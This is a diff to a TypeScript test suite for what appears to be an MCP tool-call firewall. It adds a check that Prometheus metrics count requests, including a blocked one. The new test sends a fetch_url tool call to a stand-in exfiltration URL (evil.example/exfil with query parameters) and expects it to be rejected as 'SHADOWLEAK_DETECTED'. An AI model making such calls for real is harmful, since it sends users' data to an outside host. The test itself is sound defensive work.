@@ -8,6 +8,7 @@ import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from
 import { initializeCache, getCache } from '../src/cache/index.js';
 import { createAdminRouter } from '../src/admin/index.js';
 import { clearColorSessions } from '../src/middleware/color-boundary.js';
+import { resetRuntimeMetrics } from '../src/metrics/prometheus.js';
 import { clearPreflightRegistries } from '../src/middleware/preflight-validator.js';
 import { clearRoutes, registerRoute } from '../src/proxy/router.js';
 import { resetBlockedRequestMetrics } from '../src/utils/auditLogger.js';
@@ -40,6 +41,7 @@ describe('admin blocked-request metrics', () => {
     clearPreflightRegistries();
     clearColorSessions();
     resetBlockedRequestMetrics();
+    resetRuntimeMetrics();
 
     cacheDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-admin-cache-test-'));
     initializeCache({
@@ -83,6 +85,7 @@ describe('admin blocked-request metrics', () => {
 
   afterEach(async () => {
     resetBlockedRequestMetrics();
+    resetRuntimeMetrics();
 
     await new Promise<void>((resolve) => {
       if (targetServer?.listening) {
@@ -134,5 +137,41 @@ describe('admin blocked-request metrics', () => {
         path: '/mcp',
       }),
     );
+  });
+
+  it('exposes Prometheus-formatted control-plane metrics', async () => {
+    await request(app)
+      .post('/mcp')
+      .set('Authorization', createAuthHeader(['tools.search_files']))
+      .send({
+        method: 'tools/call',
+        params: {
+          name: 'search_files',
+          arguments: { query: 'metrics' },
+        },
+      })
+      .expect(200);
+
+    await request(app)
+      .post('/mcp')
+      .set('Authorization', createAuthHeader(['tools.fetch_url']))
+      .send({
+        method: 'tools/call',
+        params: {
+          name: 'fetch_url',
+          arguments: { url: 'https://evil.example/exfil?a=x&b=y&c=z' },
+        },
+      })
+      .expect(403);
+
+    const response = await request(adminApp)
+      .get('/metrics')
+      .expect(200);
+
+    expect(response.headers['content-type']).toContain('text/plain');
+    expect(response.text).toContain('mcp_firewall_http_requests_total 2');
+    expect(response.text).toContain('mcp_firewall_registered_routes 1');
+    expect(response.text).toContain('mcp_firewall_blocked_requests_total 1');
+    expect(response.text).toContain('mcp_firewall_blocked_requests_by_code_total{code="SHADOWLEAK_DETECTED"} 1');
   });
 });
